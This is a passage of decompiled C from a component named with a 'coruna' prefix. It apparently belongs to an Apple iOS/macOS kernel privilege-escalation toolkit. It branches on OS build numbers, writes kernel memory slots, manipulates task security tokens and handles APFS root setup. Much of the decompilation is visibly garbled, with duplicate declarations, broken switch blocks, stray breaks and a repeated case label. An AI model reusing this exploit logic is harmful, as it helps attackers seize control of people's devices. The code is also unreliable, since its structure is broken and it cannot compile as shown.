  unsigned long u;
  long addr;
  uint64_t size;
  uint64_t version;
  long scratch;
  uint32_t bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t path_buf;
  uint64_t sa_saved;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t sa_new;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t path_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t tmp_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t region;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t plist;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t url_buf;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t json_buf;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t frame;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t work;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_20;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_21;
  uint64_t cache_48;
  uint64_t cache_49;
  uint64_t cache_50;
  uint64_t cache_22;
  uint64_t cache_51;
  uint64_t cache_52;
  uint64_t cache_53;
  uint64_t cache_23;
  uint64_t cache_54;
  uint64_t cache_55;
  uint64_t cache_56;
  uint64_t cache_24;
  uint64_t cache_57;
  uint64_t cache_58;
  uint64_t cache_59;
  long cache_25;
  
  cache_25 = *(long *)k_kernel_stack_chk_guard_slot;
  size = 0x28010;
  scratch = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_kernel600c_via_return_zero_28a34();
    if (handle != 0) {
      status = *(int *)(handle + 0x140);
      if (status == 0x1809) {
        addr = 0x2b8;
      }
      else if (status == 0x1f53) {
        addr = 800;
      }
      else {
        if (status != 0x1c1b) {
          version = 0x28007;
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
          return version;
          }
          ___stack_chk_fail();
        }
        addr = 0x2a0;
      }
      addr = addr + handle;
      status = coruna_kernel600c_residual_228(handle,addr,&scratch);
      if (status == 0) {
        version = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
        return version;
        }
        ___stack_chk_fail();
      }
      status = 0;
done:
      if (scratch != 0) {
        handle = coruna_kptr_in_mapped_range(handle);
        if (handle == 0) goto cleanup;
        version = size;
        if (status == 0) {
          thread_attr = 0;
          status = coruna_kernel600c_via_return_zero_2b63c(handle,0xd,&thread_attr);
          if (status == 0) {
            version = 0x28012;
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
            return version;
            }
            ___stack_chk_fail();
          }
          if (thread_attr == 0) {
            bootargs = 0x80;
            thread_attr = coruna_mach_port_request_notification_2c77c(handle,&bootargs);
            if (thread_attr == 0) {
              version = 0xad009;
              if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
              return version;
              }
              ___stack_chk_fail();
            }
            cache_57 = 0xffffffffffffffff;
            cache_24 = 0xffffffffffffffff;
            cache_59 = 0xffffffffffffffff;
            cache_58 = 0xffffffffffffffff;
            cache_54 = 0xffffffffffffffff;
            cache_23 = 0xffffffffffffffff;
            cache_56 = 0xffffffffffffffff;
            cache_55 = 0xffffffffffffffff;
            cache_51 = 0xffffffffffffffff;
            cache_22 = 0xffffffffffffffff;
            cache_53 = 0xffffffffffffffff;
            cache_52 = 0xffffffffffffffff;
            cache_48 = 0xffffffffffffffff;
            cache_21 = -1;
            cache_50 = 0xffffffffffffffff;
            cache_49 = 0xffffffffffffffff;
            status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,thread_attr,&cache_21,0x80);
            if ((status == 0) || (status = coruna_kernel600c_via_return_zero_2b63c_2(handle,0xd,thread_attr), status == 0))
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
            return version;
            }
            ___stack_chk_fail();
          }
          status = coruna_kernel600c_via_mach_vm_machine_attribute_1e63c(handle,addr,thread_attr);
        }
        else {
          cache_45 = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          cache_47 = 0xffffffffffffffff;
          cache_46 = 0xffffffffffffffff;
          cache_42 = 0xffffffffffffffff;
          cache = 0xffffffffffffffff;
          cache_44 = 0xffffffffffffffff;
          cache_43 = 0xffffffffffffffff;
          cache_39 = 0xffffffffffffffff;
          work = 0xffffffffffffffff;
          cache_41 = 0xffffffffffffffff;
          cache_40 = 0xffffffffffffffff;
          cache_36 = 0xffffffffffffffff;
          frame = 0xffffffffffffffff;
          cache_38 = 0xffffffffffffffff;
          cache_37 = 0xffffffffffffffff;
          cache_33 = 0xffffffffffffffff;
          json_buf = 0xffffffffffffffff;
          cache_35 = 0xffffffffffffffff;
          cache_34 = 0xffffffffffffffff;
          cache_30 = 0xffffffffffffffff;
          url_buf = 0xffffffffffffffff;
          cache_32 = 0xffffffffffffffff;
          cache_31 = 0xffffffffffffffff;
          cache_27 = 0xffffffffffffffff;
          plist = 0xffffffffffffffff;
          cache_29 = 0xffffffffffffffff;
          cache_28 = 0xffffffffffffffff;
          cache_24 = 0xffffffffffffffff;
          region = 0xffffffffffffffff;
          cache_26 = 0xffffffffffffffff;
          cache_25 = 0xffffffffffffffff;
          cache_21 = 0xffffffffffffffff;
          tmp_buf = 0xffffffffffffffff;
          cache_23 = 0xffffffffffffffff;
          cache_22 = 0xffffffffffffffff;
          work = 0xffffffffffffffff;
          path_buf = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          cache = 0xffffffffffffffff;
          url_buf = 0xffffffffffffffff;
          sa_new = 0xffffffffffffffff;
          frame = 0xffffffffffffffff;
          json_buf = 0xffffffffffffffff;
          tmp_buf = 0xffffffffffffffff;
          sa_saved = 0xffffffffffffffff;
          plist = 0xffffffffffffffff;
          region = 0xffffffffffffffff;
          path_buf = 0xffffffffffffffff;
          stack_guard = 0xffffffffffffffff;
          stack_guard = 0xffffffffffffffff;
          block_ctx = 0xffffffffffffffff;
          sa_new = 0xffffffffffffffff;
          sa_saved = 0xffffffffffffffff;
          serial_buf = 0xffffffffffffffff;
          action = 0xffffffffffffffff;
          block_ctx = 0xffffffffffffffff;
          action = 0xffffffffffffffff;
          bootargs = 0xffffffffffffffff;
          serial_buf = 0xffffffffffffffff;
          host_info = 0xffffffffffffffff;
          thread_attr = 0xffffffffffffffff;
          scratch = 0xffffffffffffffff;
          host_info = 0xffffffffffffffff;
          status = coruna_kernel600c_via_vm_deallocate(handle,scratch,&host_info,status);
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
        return version;
        }
        ___stack_chk_fail();
      }
      status = coruna_vm_read_overwrite(val);
      if (status == 0) {
        version = 0x28003;
      }
      else {
        if (*(int *)k_kernel_mach_task_self_slot == (int)val) {
          coruna_ctx_set_flag(handle,0x8000000);
        }
        version = 0;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
      return version;
      }
      ___stack_chk_fail();
    }
  }
  else {
    handle = coruna_kernel600c_via_return_zero_28118();
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      status = 0;
      if ((err == 0x2258 || err == 0x2712) || err == 0x225c) {
        status = 0x48;
      }
      u = coruna_return_zero_287d4(handle);
      err = coruna_kernel600c_residual_228(handle,handle + (u & 0xffffffff),&cache_21);
      version = 0x2800f;
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
      return version;
      }
      ___stack_chk_fail();
    }
  }
  version = 0x2800e;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return version;
  }
  ___stack_chk_fail();
}
uint * coruna_macho_data_const(uint *size,int flags)
{
  uint *ptr;
  bool err;
  uint8_t *buf;
  uint8_t u;
  uint size;
  uint version;
  pid_t lp7;
  int err;
  mach_port_t lm9;
  uint *str;
  uint64_t port;
  long handle;
  long addr;
  long off;
  long base;
  void *ptr;
  uint32_t tag;
  unsigned long kind;
  uint *copy;
  unsigned long type_id;
  uint type_id_8;
  uint type_id_9;
  unsigned long type_id_10;
  uint *data;
  unsigned long type_id_11;
  uint64_t type_id_12;
  void *buf;
  uint8_t tag[16];
  int scratch;
  char bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  long serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  unsigned long stack_guard;
  uint sa_saved;
  uint32_t thread_attr;
  size_t sa_new;
  stat path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  block_ctx = 0;
  action = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = '\0';
  scratch = 0;
  size[0x64c] = 0xffffffff;
  size[0x64d] = 0xffffffff;
  size[0x64e] = 0xffffffff;
  size[0x64f] = 0xffffffff;
  size[0x650] = 0xffffffff;
  size[0x651] = 0xffffffff;
  _mach_timebase_info((mach_timebase_info_t)(size + 0x97));
  _pthread_mutex_init((pthread_mutex_t *)(size + 0xcc),(pthread_mutexattr_t *)0x0);
  _pthread_mutex_init((pthread_mutex_t *)(size + 0x9a),(pthread_mutexattr_t *)0x0);
  buf = k_kernel_mach_task_self_slot;
  size = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,size + 0x99,0,0);
  str = (uint *)(unsigned long)size;
  if (size != 0) {
    copy = (uint *)(unsigned long)(size | 0x80000000);
    if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return copy;
    }
    ___stack_chk_fail(str);
  }
  str = (uint *)coruna_parse_xnu_five(&host_info,size + 0x5b,size + 0x5c);
  if ((int)str == 0) {
    copy = (uint *)0xad015;
    if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return copy;
    }
    ___stack_chk_fail(str);
  }
  size = 0x28012;
  *(uint64_t *)(size + 0x52) = scratch;
  *(uint64_t *)(size + 0x50) = host_info;
  *(long *)(size + 0x56) = serial_buf;
  *(uint64_t *)(size + 0x54) = bootargs;
  *(uint64_t *)(size + 0x58) = action;
  size[0x5a] = 8;
  data = (uint *)0x28007;
  copy = data;
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
  return copy;
  }
  ___stack_chk_fail(str);
}





bool coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_4(long handle)
{
  int err;
  int status;
  long handle;
  uint64_t u;
  long addr;
  uint size;
  unsigned long version;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint host_info;
  long serial_buf;
  
  version = *(unsigned long *)(handle + 0x158);
  handle = coruna_kernel600c_via_return_zero_28118();
  if (handle != 0) {
    status = 0x30;
    if (version < 0x18090a09600000) {
      status = 0x38;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        addr = 0x310;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x338;
        }
        size = 0x160;
      }
      else if (err == 0x1809) {
        size = status * 10;
        addr = 0x328;
      }
      else {
        if (err != 0x1c1b) {
          return false;
        }
        addr = 0x340;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          addr = 0x338;
        }
        size = status * 10;
      }
    }
    else {
      size = 0x160;
      addr = 0x308;
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return false;
      }
    }
    status = coruna_kernel600c_residual_228(handle,addr + handle,&serial_buf);
    if ((status != 0) && (handle = coruna_ptr_canonicalize(handle,serial_buf), handle != 0)) {
      handle = serial_buf + (unsigned long)size;
      addr = handle + 0x18;
      status = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr,4,&host_info);
      if ((status != 0) && ((host_info & 1) != 0)) {
        thread_attr = 0x7fffffffffffffff;
        status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + 0x20,&thread_attr,8);
        if (status != 0) {
          if (version < 0x18090a09600000) {
            bootargs = 0x7fffffffffffffff;
            handle = handle + 0x28;
            u = 8;
          }
          else {
            bootargs = coruna_cat(bootargs,0xffff);
            handle = handle + 0x1c;
            u = 2;
          }
          status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle,&bootargs,u);
          if (status != 0) {
            host_info = host_info & 0xffffcb0f;
            status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,addr,&host_info,4);
            if (status != 0) {
              scratch = 0;
              handle = 0x28;
              if (version < 0x18090a09600000) {
                handle = 0x30;
              }
              status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,addr + handle,&scratch,8);
              return status != 0;
            }
          }
        }
      }
    }
  }
  return false;
}





uint64_t coruna_kernel600c_via_kernel29478_via_vm_allocate(uint64_t *val,uint size)
{
  int err;
  void *ptr;
  uint64_t u;
  
  ptr = _calloc(0x1d60,1);
  if (ptr == (void *)0x0) {
    u = 0xad009;
  }
  else {
    u = coruna_macho_data_const(ptr,~size & 1);
    if ((int)u == 0) {
      err = coruna_statfs(ptr,(long)ptr + 600);
      if (err != 0) {
        *val = ptr;
        coruna_kernel29478_via_vm_allocate(ptr);
        return 0;
      }
      coruna_kernel29478_via_vm_allocate(ptr);
      u = 0x28021;
    }
    _free(ptr);
  }
  return u;
}





void coruna_kernel29478_via_vm_allocate(long handle)
{
  if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d18 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d20 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d28 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d30 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d38 + handle) != 0) {
    coruna_vm_allocate();
    return;
  }
  return;
}





void coruna_call_plist_dict_33324(uint64_t val,uint64_t id_2)
{
  uint64_t in_stack_00000000;
  
  coruna_plist_dict_33324(val,id_2,in_stack_00000000);
  return;
}





unsigned long coruna_plist_dict_33324(long arg,unsigned long val,uint *n)

{
  uint8_t type_id_21;
  uint type_id_17;
  uint8_t *entry_11;
  bool flags;
  int i;
  int j;
  mach_port_t lm7;
  uint type_id_14;
  kern_return_t lk9;
  unsigned long type_id_16;
  long serial_14;
  int *count;
  uint *entry_12;
  uint64_t type_id_18;
  uint64_t type_id_23;
  uint64_t type_id;
  long serial_8;
  uint type_id_9;
  uint type_id_24;
  uint type_id_20;
  uint type_id_25;
  uint type_id_26;
  uint type_id_10;
  long serial_20;
  uint64_t cache_53;
  uint cache_55;
  uint cache_95;
  unsigned long type_id_19;
  
  entry_12 = (uint *)&cache_53;
  type_id_25 = 0xad008;
  type_id_19 = 0xad008;
  type_id_24 = 0xad008;
  type_id_26 = 0xad008;
  type_id_10 = 0xad008;
  type_id_14 = 0xad001;
  if (((val >> 0x1e & 3) != 0) && (n == (uint *)0x0)) {
    return 0xad001;
  }
  *(uint64_t *)(&k_kernel_slot_18c0 + arg) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + arg) = 0;
  coruna_ctx_clear_flag(arg,0x800000);
  coruna_mach_absolute_time(arg);
  entry_11 = k_kernel_mach_task_self_slot;
  type_id_16 = coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_5(arg,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if ((int)type_id_16 != 0) {
    return type_id_16;
  }
  type_id_20 = (uint)val;
  type_id_17 = type_id_20 >> 8 & 0xff;
  if (type_id_17 == 3) {
    if ((0x1f52ffffffffff < *(unsigned long *)(arg + 0x158)) && (*(int *)(arg + 0x140) < 0x2258)) {
      if ((int)type_id_20 < 0x40000301) {
        if (type_id_20 == 0x80000306) {
          type_id_19 = coruna_strlcpy(arg,n,n + 4);
        }
        else if (type_id_20 == 0xc0000303) {
          type_id_19 = coruna_kernel600c_via_pthread_join_2f17c_2(arg,*(uint64_t *)n,n[2],n + 3);
        }
        else if (type_id_20 == 0x302) {
          type_id_19 = coruna_bzero_4(arg);
        }
      }
      else {
        switch(type_id_20) {
        case 0x40000301:
          type_id_19 = coruna_plist_dict(arg,*n);
          break;
        }
      }
    }
    break;
  }
  type_id_9 = (uint)n;
  if (type_id_17 == 1) {
    i = 0;
    cache_53 = coruna_u64_pack((cache_53), (type_id_9));
    cache_95 = 0;
    if ((int)type_id_20 < 0x109) {
      if (-0x7ffffef4 < (int)type_id_20) {
        if (type_id_20 == 0x8000010d) {
          i = 0;
          cache_55 = cache_55 & 0xffffff00;
          if (0x44a < *(unsigned long *)(arg + 0x158) >> 0x2b) {
            i = coruna_kernel600c_via_find_text_exec_34798(arg,&cache_55);
            type_id_25 = 0;
            if (i != 0) {
              cache_53 = coruna_u64_pack((cache_53), (cache_55)) & 0xffffffff000000ff;
            }
          }
          if (i == 0) {
          flags = true;
          }
          else {
          flags = false;
          *n = (uint)cache_53;
          }
          }
          else {
          if ((int)type_id_20 < 0x10d) {
          if (type_id_20 == 0x109) {
          if (0x1f52ffffffffff < *(unsigned long *)(arg + 0x158)) {
          if ((type_id_9 & 0xf) != 1) {
          type_id_25 = 0;
          }
          i = 1;
          flags = i == 0;
          }
          type_id_14 = 0x28003;
          if (!(bool)(type_id_25 == 0 & flags)) {
          type_id_14 = type_id_25;
          }
          type_id_19 = (unsigned long)type_id_14;
          break;
          }
          break;
          }
          break;
        }
        type_id_25 = type_id_26;
        flags = i == 0;
        }
        type_id_14 = 0x28003;
        if (!(bool)(type_id_25 == 0 & flags)) {
        type_id_14 = type_id_25;
        }
        type_id_19 = (unsigned long)type_id_14;
        break;
        }
        break;
      }
      break;
        }
        switch(type_id_20) {
        case 1:
        cache_53 = (unsigned long)cache_53 << 0x20;
        cache_95 = 0;
        serial_14 = coruna_kernel600c_via_return_zero_28a34(arg,*(uint32_t *)entry_11);
        type_id_14 = 0;
        if (serial_14 != 0) {
        type_id_14 = 0;
        i = *(int *)(arg + 0x140);
        if (i < 0x1f54) {
        if (i == 0x1809) {
        serial_20 = 0x160;
        serial_8 = 0x148;
        }
        else if (i == 0x1c1b) {
        serial_20 = 0x148;
        serial_8 = 0x130;
        }
        else {
        if (i != 0x1f53) break;
      }
      type_id_14 = coruna_return_zero_3043c(arg,*n,n + 1,(long)n + 6,(long)n + 5);
      break;
    case 0xc000001c:
    case 0xc000001e:
    case 0xc000001f:
    case 0xc0000021:
    case 0xc0000022:
      break;
    case 0xc000001d:
      type_id_14 = coruna_mach_port_mod_refs_30ba4(arg,*n,0,n + 1);
      break;
    case 0xc0000020:
      entry_12 = n + 1;
      type_id_14 = *n;
load_ok_107:
      type_id_14 = coruna_kernel29d3c_via_host_security_set_task_token(arg,type_id_14,entry_12);
      break;
    case 0xc0000023:
      type_id_14 = coruna_return_zero_24480(arg,*n,*(uint64_t *)(n + 2),n + 6);
      break;
    default:
      type_id_25 = type_id_10;
      if (type_id_20 == 0x8000001c) {
        type_id_14 = *(uint *)entry_11;
        entry_12 = n;
        type_id_14 = coruna_kernel29d3c_via_host_security_set_task_token(arg,type_id_14,entry_12);
        break;
        case 0xc0000023:
        type_id_14 = coruna_return_zero_24480(arg,*n,*(uint64_t *)(n + 2),n + 6);
        break;
      }
      break;
    }
  }
load_ok_96:
  type_id_25 = 0;
switchD_000333f0_caseD_4:
  type_id_26 = 0x28003;
  if (type_id_25 != 0 || type_id_14 != 0) {
    type_id_26 = type_id_25;
  }
  type_id_19 = (unsigned long)type_id_26;
switchD_000334b0_caseD_40000302:
  coruna_kernel29478_via_vm_allocate(arg);
  return type_id_19;
}





uint64_t coruna_mach_thread_self_33f24(long handle)
{
  uint8_t *ptr;
  int err;
  mach_port_t lm3;
  mach_port_t lm4;
  uint64_t u;
  uint size;
  uint32_t version;
  uint scratch;
  
  *(uint64_t *)(&k_kernel_slot_18c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_ctx_clear_flag(handle,0x800000);
  coruna_mach_absolute_time(handle);
  ptr = k_kernel_mach_task_self_slot;
  u = coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if ((int)u != 0) {
    return u;
  }
  u = 0x2801f;
  err = coruna_ctx_test_flag(handle,0x400);
  if (err != 0) {
    scratch = 0;
    err = coruna_statfs(handle,&scratch);
    if (err == 0) {
      return 0x28020;
    }
    if (scratch != 3) {
      size = *(uint *)(handle + 600);
      if (1 < size) {
        if (size != 3) {
          return 0x28020;
        }
        size = 0;
      }
      if ((scratch != size) && (err = coruna_setup_apfs_root(handle), err == 0)) {
        return 0x28020;
      }
    }
  }
  err = coruna_ctx_test_flag(handle,4);
  if (((err == 0) || (err = coruna_kernel600c_via_ctx_test_flag_7(handle,0), err != 0)) &&
     ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
      (err = coruna_task_info_2ed58(handle,*(uint32_t *)ptr,2,&k_kernel_slot_1908 + handle,8), err != 0))
     )) {
    lm4 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm4 + 1) && (lm3 = _mach_thread_self(), lm4 == lm3)) {
      lm4 = _mach_thread_self();
      version = 0x4000000;
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        version = 1;
      }
      err = coruna_return_zero_344e0(handle,lm4,version,0);
      if (err == 0) {
        return 0x2801f;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm4 = _mach_host_self(), lm4 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_ctx_test_flag(handle,0x10), err != 0 ||
         (err = coruna_host_security_set_task_token(handle,*(uint32_t *)ptr,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel29478_via_vm_allocate(handle);
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_pthread_mutex_destroy(void *ctx)
{
  pthread_mutex_t *ptr;
  uint8_t *ptr;
  int err;
  uint64_t *buf;
  uint64_t *str;
  uint32_t scratch;
  
  coruna_kernel600c_via_ctx_test_flag_4();
  coruna_kernel09_via_mach_port_allocate(ctx);
  if (*(void (**)((long)ctx + 0x1d0) != (void (*)0x0) {
    (**(void (**)((long)ctx + 0x1d0))(ctx);
  }
  ptr = k_kernel_mach_task_self_slot;
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1918) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,
               *(mach_port_name_t *)((long)ctx + 0x1918));
  }
  if ((((*(int *)((long)ctx + 0x1938) != -1) || (*(int *)((long)ctx + 0x193c) != -1)) ||
      (*(int *)((long)ctx + 0x1930) != -1)) ||
     ((*(int *)((long)ctx + 0x1934) != -1 || (*(int *)((long)ctx + 0x1940) != -1)))) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      if (*(int *)((long)ctx + 0x1938) != -1) {
        _close(*(int *)((long)ctx + 0x1938));
        *(uint32_t *)((long)ctx + 0x1938) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x193c) != -1) {
        _close(*(int *)((long)ctx + 0x193c));
        *(uint32_t *)((long)ctx + 0x193c) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1940) != -1) {
        _close(*(int *)((long)ctx + 0x1940));
        *(uint32_t *)((long)ctx + 0x1940) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1930) != -1) {
        _close(*(int *)((long)ctx + 0x1930));
        *(uint32_t *)((long)ctx + 0x1930) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1934) != -1) {
        _close(*(int *)((long)ctx + 0x1934));
        *(uint32_t *)((long)ctx + 0x1934) = 0xffffffff;
      }
      coruna_close(scratch);
    }
  }
  if (*(long *)((long)ctx + 0x28) != 0) {
    coruna_semaphore_destroy(ctx,1);
  }
  if (*(long *)((long)ctx + 0x1d40) != 0) {
    coruna_pthread_join(ctx);
  }
  if (*(long *)((long)ctx + 0x1d48) != 0) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_vm_deallocate_1e004(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0x5c) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_mach_port_deallocate_1de20(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0xac) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_pthread_from_mach_thread_np_1dea8(ctx);
      coruna_close(scratch);
    }
  }
  coruna_kernel600c_via_open_dev_null(ctx);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1920));
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1924) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1924));
  }
  if (1 < *(int *)((long)ctx + 0x10) + 1U) {
    _IOObjectRelease();
  }
  if (1 < *(int *)((long)ctx + 0x18d8) + 1U) {
    *(uint32_t *)((long)ctx + 0x18d8) = 0;
  }
  if ((*(vm_address_t *)((long)ctx + 0x118) != 0) &&
     (*(vm_size_t *)((long)ctx + 0x120) != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x118),
                   *(vm_size_t *)((long)ctx + 0x120));
  }
  if (1 < *(semaphore_t *)((long)ctx + 0x264) + 1) {
    _semaphore_destroy(*(task_t *)ptr,*(semaphore_t *)((long)ctx + 0x264));
    *(uint32_t *)((long)ctx + 0x264) = 0;
  }
  ptr = (pthread_mutex_t *)((long)ctx + 0x330);
  err = _pthread_mutex_lock(ptr);
  if (err == 0) {
    buf = *(uint64_t **)((long)ctx + 0x370);
    *(uint64_t *)((long)ctx + 0x370) = 0;
    while (buf != (uint64_t *)0x0) {
      if (1 < *(mach_port_name_t *)((long)buf + 0x1c) + 1) {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)buf + 0x1c),1,-1);
      }
      str = (uint64_t *)*buf;
      buf[4] = 0;
      buf[1] = 0;
      *buf = 0;
      buf[3] = 0;
      buf[2] = 0;
      _free(buf);
      buf = str;
    }
    _pthread_mutex_unlock(ptr);
  }
  _pthread_mutex_destroy(ptr);
  _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x268));
  if (*(long *)((long)ctx + 0x1d18) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1d18));
    *(uint64_t *)((long)ctx + 0x1d18) = 0;
  }
  if (*(long *)((long)ctx + 0x1d20) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1d20));
    *(uint64_t *)((long)ctx + 0x1d20) = 0;
  }
  if (*(long *)((long)ctx + 0x1d28) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1d28));
    *(uint64_t *)((long)ctx + 0x1d28) = 0;
  }
  if (*(long *)((long)ctx + 0x1d30) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1d30));
    *(uint64_t *)((long)ctx + 0x1d30) = 0;
  }
  if (*(long *)((long)ctx + 0x1d38) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1d38));
    *(uint64_t *)((long)ctx + 0x1d38) = 0;
  }
  if (*(long *)((long)ctx + 0x1a00) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x1a00));
    *(uint64_t *)((long)ctx + 0x1a00) = 0;
  }
  if (*(long *)((long)ctx + 0x19f8) != 0) {
    coruna_kernel29478_via_vm_deallocate_12d98();
    _free(*(void **)((long)ctx + 0x19f8));
    *(uint64_t *)((long)ctx + 0x19f8) = 0;
  }
  if (*(void **)((long)ctx + 0x1d10) != (void *)0x0) {
    _free(*(void **)((long)ctx + 0x1d10));
    *(uint64_t *)((long)ctx + 0x1d10) = 0;
    *(uint32_t *)((long)ctx + 0x1d08) = 0;
  }
  if (1 < *(mach_port_name_t *)((long)ctx + 0xe8) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0xe8));
    *(uint32_t *)((long)ctx + 0xe8) = 0;
  }
  _bzero(ctx,0x1d60);
  _free(ctx);
  return 0;
}





uint64_t coruna_return_zero_344e0(long handle,uint64_t val,uint size,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_return_zero_29c78();
  }
  else {
    handle = coruna_return_zero_29a04();
    if (handle == 0) {
      return 0;
    }
